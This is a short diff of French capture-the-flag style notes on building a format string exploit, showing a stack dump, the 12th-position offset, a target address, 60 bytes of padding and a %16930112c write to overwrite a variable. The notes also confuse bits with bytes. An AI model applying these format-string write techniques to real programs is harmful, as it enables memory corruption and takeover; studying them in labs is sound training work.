@@ -34,8 +34,6 @@ aaaa b7ff26b0 bffff754 b7fd0ff4 0 0 bffff718 804848d bffff510 200 b7fd1ac0 b7ff3
 On observe que l'adresse se trouve en 12eme position !
 
 
-M doit faire 64 bits donc nous ajouterons 60 bits de padding
-
 adresse : \x10\x98\x04\x08" ==  (  0x080484da <+54>:	mov    0x804988c,%eax) -> adresse Pointeur 
 padding:  "a" * 60 64 - 4 == 60 
 modification : %16930112c  -> 16930116 - 4 (adress of m)
